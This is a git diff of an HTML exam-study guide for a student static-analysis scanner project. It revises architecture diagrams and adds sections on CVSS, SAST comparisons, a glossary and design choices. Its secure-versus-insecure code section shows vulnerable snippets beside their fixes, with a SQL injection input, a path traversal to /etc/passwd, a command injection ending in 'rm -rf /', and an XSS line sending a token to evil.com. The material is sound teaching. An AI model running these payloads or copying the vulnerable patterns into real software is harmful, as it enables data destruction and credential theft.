-        -AiProvider[] providers
+        -List~AiProvider~ providers
         +analyzeIssue()
         +processScanIssues()
         +getProviders()
     }
     class AiScannerService {
-        -AiProvider[] providers
+        -List~AiProvider~ providers
         +scan()
         -scanFileWithFallback()
         -getRelevantFiles()
@@ -745,46 +1167,46 @@ sequenceDiagram
     participant AI as AI Providers
 
     Note over Dev,GH: GitHub OAuth Login
-    Dev->>FE: Click "Login with GitHub"
+    Dev->>FE: Click Login with GitHub
     FE->>BE: GET /auth/github
-    BE->>GH: Redirect → OAuth authorize
+    BE->>GH: Redirect to OAuth authorize
     Dev->>GH: Approve permissions
     GH->>BE: GET /callback?code=xxx
-    BE->>GH: Exchange code → access_token
+    BE->>GH: Exchange code for access_token
     BE->>DB: Upsert user record
     BE->>FE: Redirect /dashboard + JWT cookie
     FE->>BE: GET /auth/me
-    BE-->>FE: User + stats
+    BE-->>FE: User object + stats
 
     Note over Dev,AI: Start Scan
     Dev->>FE: Submit repo URL
     FE->>BE: POST /api/scans
     BE->>DB: INSERT scan PENDING
-    BE->>RQ: scanQueue.add(job)
-    BE-->>FE: {scanId, status: PENDING}
-    FE->>BE: SSE stream /scans/:id/stream
+    BE->>RQ: scanQueue.add job
+    BE-->>FE: scanId + status PENDING
+    FE->>BE: SSE stream /scans/id/stream
 
     RQ->>GH: git clone repo
-    RQ->>DB: UPDATE CLONING → SCANNING
+    RQ->>DB: UPDATE CLONING to SCANNING
     loop Each source file
-        RQ->>AI: NVIDIA: analyze(file)
+        RQ->>AI: NVIDIA analyze file
         alt success
-            AI-->>RQ: findings[]
-        else fail → fallback
-            RQ->>AI: Gemini → OpenAI
-            AI-->>RQ: findings[]
+            AI-->>RQ: findings array
+        else fail, try fallback
+            RQ->>AI: Gemini then OpenAI
+            AI-->>RQ: findings array
         end
         RQ->>DB: INSERT issues
     end
 
     RQ->>DB: UPDATE AI_ANALYSIS
     loop Batch enrich issues
-        RQ->>AI: analyze(issue)
-        AI-->>RQ: explanation+fix
+        RQ->>AI: analyze issue
+        AI-->>RQ: explanation + fix
         RQ->>DB: UPDATE issue aiFields
     end
     RQ->>DB: UPDATE COMPLETED + riskScore
-    BE-->>FE: SSE: done event
+    BE-->>FE: SSE done event
     FE->>Dev: Show results
   </div>
   <div class="diagram-explain">
@@ -796,20 +1218,20 @@ sequenceDiagram
   <h4>4.8 — Collaboration Diagram</h4>
   <div class="mermaid">
 flowchart LR
-    SC["ScanController"] -- "1: startScan()" --> SS
-    SS["ScanService"] -- "2: prisma.create(scan)" --> DB1[("PostgreSQL")]
-    SS -- "3: scanQueue.add(job)" --> BQ["Bull Queue"]
-    BQ -- "4: process(job)" --> QW["Queue Worker"]
-    QW -- "5a: git.clone()" --> GIT["SimpleGit"]
-    QW -- "5b: parse(zip)" --> ZIP["Unzipper"]
-    QW -- "6: scanner.scan(dir)" --> AIS["AiScannerService"]
-    AIS -- "7: withFallback(file)" --> AISV["AiService"]
-    AISV -- "8a: nvidia.scan()" --> NV["NvidiaProvider"]
-    AISV -- "8b: gemini.scan()" --> GM["GeminiProvider"]
-    AISV -- "8c: openai.scan()" --> OA["OpenAIProvider"]
-    QW -- "9: processScanIssues()" --> IS["IssueService"]
-    IS -- "10: aiService.analyze()" --> AISV
-    IS -- "11: prisma.update(issue)" --> DB2[("PostgreSQL")]
+    SC["ScanController"] -->|1 startScan| SS
+    SS["ScanService"] -->|2 prisma.create| DB1[("PostgreSQL")]
+    SS -->|3 scanQueue.add| BQ["Bull Queue"]
+    BQ -->|4 process job| QW["Queue Worker"]
+    QW -->|5a git.clone| GIT["SimpleGit"]
+    QW -->|5b parse zip| ZIP["Unzipper"]
+    QW -->|6 scanner.scan| AIS["AiScannerService"]
+    AIS -->|7 withFallback| AISV["AiService"]
+    AISV -->|8a nvidia.scan| NV["NvidiaProvider"]
+    AISV -->|8b gemini.scan| GM["GeminiProvider"]
+    AISV -->|8c openai.scan| OA["OpenAIProvider"]
+    QW -->|9 processScanIssues| IS["IssueService"]
+    IS -->|10 aiService.analyze| AISV
+    IS -->|11 prisma.update| DB2[("PostgreSQL")]
   </div>
   <div class="diagram-explain">
     <p><strong>Collaboration Diagram</strong> shows how objects collaborate to complete a task. Numbers show the sequence of method calls. Unlike sequence diagrams (which are time-linear), collaboration diagrams emphasise the relationships between objects. The numbered calls show the order of execution during a scan job.</p>
@@ -874,29 +1296,29 @@ flowchart TB
     Browser["🌐 User Browser"]
     subgraph Host["Host Machine (Linux)"]
         subgraph DockerNet["Docker Network: major-sast-agent_default"]
-            subgraph FEC["Container: frontend\nnginx:1.27-alpine"]
-                Nginx["nginx :80\n(SPA fallback)"]
+            subgraph FEC["Container frontend\nnginx 1.27-alpine"]
+                Nginx["nginx port 80\nSPA fallback"]
             end
-            subgraph BEC["Container: backend\nnode:20-alpine"]
-                Node["node dist/index.js :3001"]
+            subgraph BEC["Container backend\nnode 20-alpine"]
+                Node["node dist/index.js port 3001"]
                 Bearer2["Bearer CLI"]
-                TmpVol["Volume: scan_data\n/tmp/sast-agent"]
+                TmpVol["Volume scan_data\n/tmp/sast-agent"]
             end
-            subgraph PGC["Container: postgres\npostgres:15-alpine"]
-                PGP["postgres :5432"]
-                PGVol["Volume: pg_data"]
+            subgraph PGC["Container postgres\npostgres 15-alpine"]
+                PGP["postgres port 5432"]
+                PGVol["Volume pg_data"]
             end
-            subgraph RDC["Container: redis\nredis:7-alpine"]
-                RDP["redis :6379"]
+            subgraph RDC["Container redis\nredis 7-alpine"]
+                RDP["redis port 6379"]
             end
         end
         P5173["Port 5173"] & P3001["Port 3001"]
     end
 
-    Browser -- ":5173" --> P5173 --> Nginx
-    Browser -- ":3001" --> P3001 --> Node
-    Node -- "TCP 5432" --> PGP
-    Node -- "TCP 6379" --> RDP
+    Browser -->|port 5173| P5173 --> Nginx
+    Browser -->|port 3001| P3001 --> Node
+    Node -->|TCP 5432| PGP
+    Node -->|TCP 6379| RDP
     Node --> Bearer2
     Node --> TmpVol
     PGP --> PGVol
@@ -919,7 +1341,7 @@ stateDiagram-v2
     PROCESSING --> AI_ANALYSIS : Raw issues saved to DB
     PROCESSING --> FAILED : DB write error
     AI_ANALYSIS --> COMPLETED : All issues enriched
-    AI_ANALYSIS --> COMPLETED : Partial — some providers exhausted
+    AI_ANALYSIS --> COMPLETED : Partial - some providers exhausted
     AI_ANALYSIS --> FAILED : Critical DB failure
     COMPLETED --> [*]
     FAILED --> [*]
@@ -930,7 +1352,7 @@ stateDiagram-v2
     end note
     note right of SCANNING
         File walker reads each file
-        AI Fallback: NVIDIA→Gemini→OpenAI
+        AI Fallback: NVIDIA to Gemini to OpenAI
         1.5s delay per file
     end note
     note right of AI_ANALYSIS
@@ -1665,7 +2087,584 @@ prisma.scan.findFirstOrThrow({
 </section>
 <!-- END QA -->
 
-<div style="text-align:center;padding:3rem 0 2rem;color:var(--text2);font-size:.85rem;border-top:1px solid var(--border);margin-top:2rem">
+<!-- ═══════════════════════════════════════════════════════
+     SECTION 12 — CVSS SCORE BREAKDOWN
+═══════════════════════════════════════════════════════ -->
+<section id="cvss">
+<h2 class="section-title"><span class="num">12</span> CVSS Score — Deep Dive</h2>
+
+<div class="card">
+<h4>What is CVSS?</h4>
+<p><strong>Common Vulnerability Scoring System (CVSS)</strong> is the industry-standard framework for rating the severity of security vulnerabilities. Version 3.1 (current) produces a score from <strong>0.0 to 10.0</strong>. It is NOT a measure of risk to your specific system — it is a measure of the intrinsic severity of the vulnerability itself.</p>
+<div class="flow" style="margin-top:.75rem">
+  <span class="flow-step active">0.0 = None</span>
+  <span class="flow-arrow">→</span>
+  <span class="flow-step">0.1–3.9 = Low</span>
+  <span class="flow-arrow">→</span>
+  <span class="flow-step">4.0–6.9 = Medium</span>
+  <span class="flow-arrow">→</span>
+  <span class="flow-step">7.0–8.9 = High</span>
+  <span class="flow-arrow">→</span>
+  <span class="flow-step active">9.0–10.0 = Critical</span>
+</div>
+</div>
+
+<div class="subsection">
+<h3>The 8 Metric Groups</h3>
+<p style="color:var(--fg-muted);font-size:.9rem;margin-bottom:1rem">CVSS v3.1 Base Score uses 8 metrics split into two groups: <strong>Exploitability</strong> (how easy to attack) and <strong>Impact</strong> (what the attacker gains).</p>
+<div class="card-grid">
+  <div class="card">
+    <h4>Exploitability Metrics</h4>
+    <table>
+      <thead><tr><th>Metric</th><th>Values</th><th>Meaning</th></tr></thead>
+      <tbody>
+        <tr><td><strong>AV</strong> — Attack Vector</td><td>Network / Adjacent / Local / Physical</td><td>How far away must attacker be? Network = worst (remote exploit)</td></tr>
+        <tr><td><strong>AC</strong> — Attack Complexity</td><td>Low / High</td><td>Low = no special conditions needed. High = race condition, specific config required</td></tr>
+        <tr><td><strong>PR</strong> — Privileges Required</td><td>None / Low / High</td><td>None = unauthenticated. High = admin account needed</td></tr>
+        <tr><td><strong>UI</strong> — User Interaction</td><td>None / Required</td><td>None = attacker acts alone. Required = victim must click link/open file</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="card">
+    <h4>Impact Metrics</h4>
+    <table>
+      <thead><tr><th>Metric</th><th>Values</th><th>Meaning</th></tr></thead>
+      <tbody>
+        <tr><td><strong>S</strong> — Scope</td><td>Unchanged / Changed</td><td>Changed = attacker can pivot to OTHER systems (e.g., container escape)</td></tr>
+        <tr><td><strong>C</strong> — Confidentiality</td><td>None / Low / High</td><td>High = all data exposed (passwords, PII, source code)</td></tr>
+        <tr><td><strong>I</strong> — Integrity</td><td>None / Low / High</td><td>High = attacker can modify any data (database wipe, code injection)</td></tr>
+        <tr><td><strong>A</strong> — Availability</td><td>None / Low / High</td><td>High = system completely down (DDoS, crash loop)</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+</div>
+
+<div class="subsection">
+<h3>CVSS Vector String</h3>
+<p style="color:var(--fg-muted);font-size:.9rem;margin-bottom:.75rem">Each vulnerability has a compact <strong>vector string</strong> encoding all 8 metrics. Examiners often show you a string and ask you to decode it.</p>
+<pre><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></pre>
+<div class="card">
+  <h4>Decoded: Log4Shell (CVE-2021-44228) — Score 10.0 Critical</h4>
+  <table>
+    <thead><tr><th>Part</th><th>Value</th><th>Meaning</th></tr></thead>
+    <tbody>
+      <tr><td>AV:N</td><td>Network</td><td>Exploitable remotely over internet — no physical access needed</td></tr>
+      <tr><td>AC:L</td><td>Low</td><td>No special conditions — send one crafted log message</td></tr>
+      <tr><td>PR:N</td><td>None</td><td>No account needed — unauthenticated attacker</td></tr>
+      <tr><td>UI:N</td><td>None</td><td>Victim does nothing — server processes attacker's input automatically</td></tr>
+      <tr><td>S:C</td><td>Changed</td><td>Attacker can escape to underlying OS, other containers</td></tr>
+      <tr><td>C:H</td><td>High</td><td>Full confidentiality loss — all data readable</td></tr>
+      <tr><td>I:H</td><td>High</td><td>Full integrity loss — attacker runs arbitrary code</td></tr>
+      <tr><td>A:H</td><td>High</td><td>Full availability loss — server can be shut down</td></tr>
+    </tbody>
+  </table>
+</div>
+</div>
+
+<div class="subsection">
+<h3>Real Examples — Score Comparison</h3>
+<div class="card-grid">
+  <div class="card">
+    <h4><span class="sev sev-critical">Critical 9.8</span> — SQL Injection (no auth)</h4>
+    <pre><code>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></pre>
+    <p>Remote attacker, no credentials, no user interaction, full data loss. Only <strong>S:U</strong> (Unchanged) prevents 10.0 — attack stays within the app boundary.</p>
+  </div>
+  <div class="card">
+    <h4><span class="sev sev-high">High 8.8</span> — CSRF leading to admin action</h4>
+    <pre><code>AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></pre>
+    <p><strong>UI:R</strong> drops score — victim must click a malicious link. Otherwise identical impact. One click less freedom → score drops by ~1 point.</p>
+  </div>
+  <div class="card">
+    <h4><span class="sev sev-medium">Medium 5.3</span> — Info Disclosure (public endpoint leaks version)</h4>
+    <pre><code>AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</code></pre>
+    <p>Remote, no auth, easy — but only leaks non-critical info (<strong>C:L</strong>). No integrity or availability impact at all. Low chroma = low score.</p>
+  </div>
+  <div class="card">
+    <h4><span class="sev sev-low">Low 2.7</span> — Local path traversal (auth required)</h4>
+    <pre><code>AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N</code></pre>
+    <p>Requires <strong>local access + admin credentials</strong> (PR:H). By definition, if attacker already has admin, damage is limited. Real-world risk is low despite sounding scary.</p>
+  </div>
+</div>
+</div>
+
+<div class="highlight">
+  <p><strong>How this project uses CVSS:</strong> Each <code>Issue</code> record stores a <code>cvssScore</code> float. The <code>riskScore</code> on a <code>Scan</code> is computed as a weighted average: Critical issues contribute 4×, High 2×, Medium 1×, Low 0.3×. This gives a 0–100 risk score displayed in the dashboard.</p>
+</div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════
+     SECTION 13 — SECURE vs INSECURE CODE
+═══════════════════════════════════════════════════════ -->
+<section id="secure-code">
+<h2 class="section-title"><span class="num">13</span> Secure vs. Insecure Code</h2>
+<p style="color:var(--fg-muted);margin-bottom:1.5rem;font-size:.95rem">The core value proposition of SAST: catch these patterns <em>before</em> they reach production. Each example shows what the scanner flags and why.</p>
+
+<div class="subsection">
+<h3>1 — SQL Injection (CWE-89, OWASP A03)</h3>
+<div class="card-grid">
+  <div class="card" style="border-top:2.5px solid var(--sev-critical)">
+    <h4><span class="sev sev-critical">Critical</span> Vulnerable Code</h4>
+    <pre><code>// BAD: raw string interpolation in SQL
+const query = `SELECT * FROM users
+  WHERE email = '${req.body.email}'`;
+db.query(query);</code></pre>
+    <p style="margin-top:.5rem">Attacker inputs <code>' OR '1'='1</code> as email → dumps entire users table. SAST flags: <em>unsanitised user input concatenated directly into SQL string</em>.</p>
+  </div>
+  <div class="card" style="border-top:2.5px solid var(--sev-ok)">
+    <h4><span class="sev" style="color:var(--sev-ok);background:var(--sev-ok-bg)">Secure</span> Fixed Code</h4>
+    <pre><code>// GOOD: parameterised query (Prisma)
+const user = await prisma.user.findUnique({
+  where: { email: req.body.email }
+});
+// Prisma always uses prepared statements
+// — input is never interpolated into SQL</code></pre>
+    <p style="margin-top:.5rem">Prisma ORM generates <code>SELECT * FROM users WHERE email = $1</code> with the value bound separately. SQL structure and data are never mixed.</p>
+  </div>
+</div>
+</div>
+
+<div class="subsection">
+<h3>2 — Path Traversal (CWE-22, OWASP A01)</h3>
+<div class="card-grid">
+  <div class="card" style="border-top:2.5px solid var(--sev-critical)">
+    <h4><span class="sev sev-critical">Critical</span> Vulnerable Code</h4>
+    <pre><code>// BAD: user controls file path directly
+const file = req.query.filename;
+const content = fs.readFileSync(
+  `/app/uploads/${file}`
+);
+// Attacker sends: ../../etc/passwd
+// Reads: /app/uploads/../../etc/passwd
+//      = /etc/passwd  ← server secrets</code></pre>
+  </div>
+  <div class="card" style="border-top:2.5px solid var(--sev-ok)">
+    <h4><span class="sev" style="color:var(--sev-ok);background:var(--sev-ok-bg)">Secure</span> Fixed Code (our ZIP extractor)</h4>
+    <pre><code>// GOOD: canonicalise and validate
+const destPath = path.join(extractDir, entry.path);
+const realDest = path.resolve(destPath);
+const realBase = path.resolve(extractDir);
+
+if (!realDest.startsWith(realBase + path.sep)) {
+  throw new Error('Path traversal detected');
+}
+// Now safe to write
+entry.pipe(createWriteStream(destPath));</code></pre>
+    <p style="margin-top:.5rem">This exact pattern exists in <code>backend/src/queue/scan.queue.ts</code>. <code>path.resolve()</code> collapses all <code>../</code> sequences; the <code>startsWith</code> check guarantees destination is inside the extract dir.</p>
+  </div>
+</div>
+</div>
+
+<div class="subsection">
+<h3>3 — Broken Authentication / Insecure JWT Storage (CWE-522, OWASP A07)</h3>
+<div class="card-grid">
+  <div class="card" style="border-top:2.5px solid var(--sev-high)">
+    <h4><span class="sev sev-high">High</span> Vulnerable Pattern</h4>
+    <pre><code>// BAD: JWT in localStorage
+localStorage.setItem('token', jwt);
+
+// Any JS on the page can read it:
+// XSS payload:
+fetch('https://evil.com/steal?t='
+  + localStorage.getItem('token'));</code></pre>
+    <p style="margin-top:.5rem">XSS vulnerability on ANY page → token stolen → account takeover. localStorage has no security boundary.</p>
+  </div>
+  <div class="card" style="border-top:2.5px solid var(--sev-ok)">
+    <h4><span class="sev" style="color:var(--sev-ok);background:var(--sev-ok-bg)">Secure</span> Our Implementation</h4>
+    <pre><code>// GOOD: HttpOnly cookie (server sets it)
+res.cookie('jwt', token, {
+  httpOnly: true,   // JS cannot read
+  secure: true,     // HTTPS only
+  sameSite: 'lax',  // CSRF protection
+  maxAge: 7 * 24 * 60 * 60 * 1000
+});
+// Browser sends automatically on each
+// request — frontend never sees token</code></pre>
+    <p style="margin-top:.5rem"><code>httpOnly</code> makes the cookie invisible to <code>document.cookie</code>. XSS can steal anything in JS memory — but never the auth token.</p>
+  </div>
+</div>
+</div>
+
+<div class="subsection">
+<h3>4 — Mass Assignment / Broken Access Control (CWE-915, OWASP A01)</h3>
+<div class="card-grid">
+  <div class="card" style="border-top:2.5px solid var(--sev-high)">
+    <h4><span class="sev sev-high">High</span> Vulnerable Code</h4>
+    <pre><code>// BAD: blindly trust request body
+app.put('/api/users/:id', async (req) => {
+  await db.users.update({
+    where: { id: req.params.id },
+    data: req.body   // attacker sends:
+    // { role: 'admin', email: 'x@y.com' }
+  });
+});</code></pre>
+    <p style="margin-top:.5rem">Attacker promotes themselves to admin by including <code>"role":"admin"</code> in the request body.</p>
+  </div>
+  <div class="card" style="border-top:2.5px solid var(--sev-ok)">
+    <h4><span class="sev" style="color:var(--sev-ok);background:var(--sev-ok-bg)">Secure</span> Our Approach</h4>
+    <pre><code>// GOOD: whitelist allowed fields + check ownership
+app.put('/api/projects/:id', authenticate, async (req) => {
+  const { name, description } = req.body; // whitelist
+  await prisma.project.update({
+    where: {
+      id: req.params.id,
+      userId: req.user.id  // ownership check
+    },
+    data: { name, description } // only safe fields
+  });
+});</code></pre>
+    <p style="margin-top:.5rem">Every Prisma write includes <code>userId: req.user.id</code>. If the record doesn't belong to you, Prisma returns <code>null</code> — not a 403, which would leak existence of the record.</p>
+  </div>
+</div>
+</div>
+
+<div class="subsection">
+<h3>5 — Command Injection (CWE-78, OWASP A03)</h3>
+<div class="card-grid">
+  <div class="card" style="border-top:2.5px solid var(--sev-critical)">
+    <h4><span class="sev sev-critical">Critical</span> Vulnerable Code</h4>
+    <pre><code>// BAD: shell=true with user input
+const { exec } = require('child_process');
+exec(`git clone ${req.body.repoUrl}`,
+  (err, stdout) => { ... });
+// Attacker sends:
+// https://github.com/x/y; rm -rf /
+// Shell interprets semicolon as
+// command separator → server wiped</code></pre>
+  </div>
+  <div class="card" style="border-top:2.5px solid var(--sev-ok)">
+    <h4><span class="sev" style="color:var(--sev-ok);background:var(--sev-ok-bg)">Secure</span> Our Implementation</h4>
+    <pre><code>// GOOD: simple-git library (no shell)
+import simpleGit from 'simple-git';
+const git = simpleGit();
+await git.clone(repoUrl, destPath);
+// simple-git calls git binary directly
+// with args as array — no shell involved
+// semicolons are just part of the URL
+// string, never interpreted as commands</code></pre>
+    <p style="margin-top:.5rem"><code>simple-git</code> uses Node's <code>spawn</code> with <code>shell: false</code>. Arguments never pass through <code>/bin/sh</code>. Shell injection is structurally impossible.</p>
+  </div>
+</div>
+</div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════
+     SECTION 14 — SAST vs DAST vs IAST vs SCA
+═══════════════════════════════════════════════════════ -->
+<section id="comparison">
+<h2 class="section-title"><span class="num">14</span> AST Comparison: SAST vs DAST vs IAST vs SCA</h2>
+
+<div class="card" style="margin-bottom:1.5rem">
+<table>
+  <thead>
+    <tr>
+      <th>Property</th>
+      <th>SAST</th>
+      <th>DAST</th>
+      <th>IAST</th>
+      <th>SCA</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Full name</strong></td>
+      <td>Static Application Security Testing</td>
+      <td>Dynamic Application Security Testing</td>
+      <td>Interactive Application Security Testing</td>
+      <td>Software Composition Analysis</td>
+    </tr>
+    <tr>
+      <td><strong>When it runs</strong></td>
+      <td>At build/commit time — no running app needed</td>
+      <td>Against a running application (staging/prod)</td>
+      <td>During runtime — agent inside the app</td>
+      <td>At build time — scans dependency manifests</td>
+    </tr>
+    <tr>
+      <td><strong>What it sees</strong></td>
+      <td>Source code, AST, control/data flow graphs</td>
+      <td>HTTP responses, network behaviour, error messages</td>
+      <td>Runtime call stack, memory, actual data flows</td>
+      <td><code>package.json</code>, <code>pom.xml</code>, <code>requirements.txt</code> — dependency trees</td>
+    </tr>
+    <tr>
+      <td><strong>Finds</strong></td>
+      <td>Injection, hardcoded secrets, path traversal, insecure patterns</td>
+      <td>Auth bypass, CSRF, runtime misconfigs, SSL issues</td>
+      <td>Injection with exact taint paths, runtime-confirmed vulns</td>
+      <td>Known CVEs in open-source dependencies (Log4j, OpenSSL etc.)</td>
+    </tr>
+    <tr>
+      <td><strong>Misses</strong></td>
+      <td>Runtime-only issues (wrong config, env-specific), false logic</td>
+      <td>Code-level issues (hardcoded passwords deep in code), needs a live env</td>
+      <td>Issues that never execute during test run</td>
+      <td>Custom code vulnerabilities (only checks known CVE databases)</td>
+    </tr>
+    <tr>
+      <td><strong>False positive rate</strong></td>
+      <td>High — no runtime context, flags possible paths not actual ones</td>
+      <td>Low — only reports what actually responded</td>
+      <td>Lowest — has runtime proof</td>
+      <td>Low — CVE match is definitive</td>
+    </tr>
+    <tr>
+      <td><strong>Speed</strong></td>
+      <td>Fast (minutes)</td>
+      <td>Slow (hours — must crawl all endpoints)</td>
+      <td>Continuous — runs during QA/load tests</td>
+      <td>Very fast (seconds — just reads lock files)</td>
+    </tr>
+    <tr>
+      <td><strong>Box type</strong></td>
+      <td>White-box (full code access)</td>
+      <td>Black-box (external attacker view)</td>
+      <td>Grey-box (code + runtime)</td>
+      <td>White-box (dependency metadata)</td>
+    </tr>
+    <tr>
+      <td><strong>Where in SDLC</strong></td>
+      <td>Design / Code / CI gate</td>
+      <td>Pre-prod / Staging / Pen test</td>
+      <td>QA / Performance testing</td>
+      <td>Code / CI gate (blocks on critical CVEs)</td>
+    </tr>
+    <tr>
+      <td><strong>This project</strong></td>
+      <td>✅ This is what we built</td>
+      <td>❌ Not implemented</td>
+      <td>❌ Not implemented</td>
+      <td>❌ Not implemented (future: npm audit integration)</td>
+    </tr>
+    <tr>
+      <td><strong>Tools</strong></td>
+      <td>Bearer (ours), SonarQube, Semgrep, CodeQL</td>
+      <td>OWASP ZAP, Burp Suite, Nikto</td>
+      <td>Contrast Security, Seeker</td>
+      <td>Snyk, OWASP Dependency-Check, GitHub Dependabot</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<div class="highlight">
+  <p><strong>Why SAST for this project?</strong> SAST requires only source code — no running environment, no test accounts, no network access. This makes it ideal for analysing <em>any</em> submitted GitHub repo without trust assumptions. DAST would require deploying the user's code, which is a major security risk for a multi-tenant platform.</p>
+</div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════
+     SECTION 15 — EXAM BUZZWORD GLOSSARY
+═══════════════════════════════════════════════════════ -->
+<section id="glossary">
+<h2 class="section-title"><span class="num">15</span> Exam Buzzword Glossary</h2>
+<p style="color:var(--fg-muted);margin-bottom:1.5rem;font-size:.9rem">Alphabetical quick-reference. Read this 5 minutes before your VIVA.</p>
+
+<div class="term-grid">
+  <div class="term-card"><span class="full">AppSec</span><span class="term">Application Security</span><div class="def">The practice of finding, fixing and preventing security vulnerabilities in software applications throughout their lifecycle.</div></div>
+  <div class="term-card"><span class="full">AST</span><span class="term">Application Security Testing</span><div class="def">Umbrella term covering SAST, DAST, IAST, and SCA — all methods of finding security issues in applications.</div></div>
+  <div class="term-card"><span class="full">Auth</span><span class="term">Authentication vs Authorisation</span><div class="def">Authentication = verifying identity (who are you?). Authorisation = verifying permission (what can you do?). JWT handles auth; row-level userId checks handle authz.</div></div>
+  <div class="term-card"><span class="full">CVE</span><span class="term">Common Vulnerabilities and Exposures</span><div class="def">A public database of known vulnerabilities. Each has a unique ID (e.g., CVE-2021-44228 for Log4Shell) and CVSS score. Maintained by MITRE.</div></div>
+  <div class="term-card"><span class="full">CVSS</span><span class="term">Common Vulnerability Scoring System</span><div class="def">Standardised 0–10 score for vulnerability severity. Based on 8 metrics: AV, AC, PR, UI, S, C, I, A. Not the same as business risk.</div></div>
+  <div class="term-card"><span class="full">CWE</span><span class="term">Common Weakness Enumeration</span><div class="def">A catalogue of software weakness types (e.g., CWE-89 = SQL Injection). Where CVE = a specific instance, CWE = the class of weakness.</div></div>
+  <div class="term-card"><span class="full">DAST</span><span class="term">Dynamic Application Security Testing</span><div class="def">Tests a running application by sending attack payloads and observing responses. Black-box testing. Tools: OWASP ZAP, Burp Suite.</div></div>
+  <div class="term-card"><span class="full">IAST</span><span class="term">Interactive Application Security Testing</span><div class="def">Agent inside the running app observes actual data flows during test execution. Lowest false-positive rate but requires code instrumentation.</div></div>
+  <div class="term-card"><span class="full">JWT</span><span class="term">JSON Web Token</span><div class="def">Stateless auth token: base64(header).base64(payload).signature. Server verifies signature without a database lookup. Stored in HttpOnly cookie in this project.</div></div>
+  <div class="term-card"><span class="full">MFA</span><span class="term">Multi-Factor Authentication</span><div class="def">Requires 2+ proofs of identity: something you know (password) + something you have (TOTP app) + something you are (biometric).</div></div>
+  <div class="term-card"><span class="full">OAuth2</span><span class="term">Open Authorisation 2.0</span><div class="def">Delegation protocol — lets users grant apps access to their resources without sharing passwords. GitHub OAuth gives us a token to read user profile, not the password.</div></div>
+  <div class="term-card"><span class="full">OWASP</span><span class="term">Open Web Application Security Project</span><div class="def">Non-profit producing the Top 10 list of most critical web security risks, updated every few years. A01:2021 is Broken Access Control.</div></div>
+  <div class="term-card"><span class="full">RBAC</span><span class="term">Role-Based Access Control</span><div class="def">Access granted based on role (admin, user, guest). Simpler than ABAC but less granular. This project uses ownership-based control (row-level userId).</div></div>
+  <div class="term-card"><span class="full">SAST</span><span class="term">Static Application Security Testing</span><div class="def">Analyses source code without executing it. White-box testing. Finds issues early (shift-left). This project implements SAST using Bearer CLI + AI analysis.</div></div>
+  <div class="term-card"><span class="full">SCA</span><span class="term">Software Composition Analysis</span><div class="def">Scans dependency manifests for third-party libraries with known CVEs. Tools: Snyk, Dependabot, OWASP Dependency-Check.</div></div>
+  <div class="term-card"><span class="full">SDLC</span><span class="term">Software Development Lifecycle</span><div class="def">The full process: Plan → Design → Develop → Test → Deploy → Maintain. Shift-left security = moving security testing earlier (to Design/Develop phase).</div></div>
+  <div class="term-card"><span class="full">SDL</span><span class="term">Security Development Lifecycle</span><div class="def">Microsoft's specific methodology for integrating security into every SDLC phase. Popularised threat modelling as a required design step.</div></div>
+  <div class="term-card"><span class="full">SSE</span><span class="term">Server-Sent Events</span><div class="def">Browser standard for server-to-client push over persistent HTTP connection. Unidirectional (unlike WebSocket). Used in this project for real-time scan progress.</div></div>
+  <div class="term-card"><span class="full">SSRF</span><span class="term">Server-Side Request Forgery</span><div class="def">Attacker tricks server into making HTTP requests to internal services (e.g., AWS metadata at 169.254.169.254). OWASP A10:2021.</div></div>
+  <div class="term-card"><span class="full">TLS/SSL</span><span class="term">Transport Layer Security</span><div class="def">Cryptographic protocol encrypting data in transit. TLS 1.3 is current. SSL is deprecated. Helmet sets HSTS header to enforce HTTPS in this project.</div></div>
+  <div class="term-card"><span class="full">XSS</span><span class="term">Cross-Site Scripting</span><div class="def">Injecting malicious JavaScript into a page viewed by other users. Reflected (in URL), Stored (in database), DOM-based (client-side only). HttpOnly cookies prevent token theft via XSS.</div></div>
+  <div class="term-card"><span class="full">Zero-Day</span><span class="term">0-day Vulnerability</span><div class="def">A vulnerability with no available patch — discovered and exploited before the vendor knows it exists. CVSS scores can still apply, but no fix exists yet.</div></div>
+</div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════
+     SECTION 16 — WHY NOT X? DESIGN DECISIONS
+═══════════════════════════════════════════════════════ -->
+<section id="whynot">
+<h2 class="section-title"><span class="num">16</span> Why Not X? — Design Decision Justifications</h2>
+<p style="color:var(--fg-muted);margin-bottom:1.5rem;font-size:.9rem">Examiners frequently probe design choices. Every answer follows the pattern: <em>we chose A over B because of constraint C</em>.</p>
+
+<div class="card-grid">
+  <div class="card">
+    <h4>Why SSE instead of WebSockets?</h4>
+    <p><strong>Chosen:</strong> Server-Sent Events (SSE)<br><strong>Rejected:</strong> WebSocket</p>
+    <p style="margin-top:.5rem"><strong>Reason:</strong> Scan progress is inherently <em>unidirectional</em> — server pushes updates, client only reads. WebSocket adds bidirectional complexity (connection upgrade, ping/pong keepalive, separate ws:// protocol) for no benefit. SSE is plain HTTP/1.1, works through proxies and firewalls, reconnects automatically, and needs zero extra infrastructure. Right tool for one-way data push.</p>
+  </div>
+  <div class="card">
+    <h4>Why Bull Queue instead of direct processing?</h4>
+    <p><strong>Chosen:</strong> Bull Queue (Redis-backed job queue)<br><strong>Rejected:</strong> Synchronous handler / cron job</p>
+    <p style="margin-top:.5rem"><strong>Reason:</strong> Scanning a repo takes 30–300 seconds. A synchronous HTTP handler would hold the connection open, block the event loop, and time out. Bull Queue decouples the API response from the work: POST /scans returns immediately with a job ID, the queue worker processes asynchronously, and SSE delivers progress. Bull also provides retry logic, job persistence, and concurrency control out of the box.</p>
+  </div>
+  <div class="card">
+    <h4>Why Prisma instead of raw SQL?</h4>
+    <p><strong>Chosen:</strong> Prisma ORM<br><strong>Rejected:</strong> Raw <code>pg</code> queries / Knex.js</p>
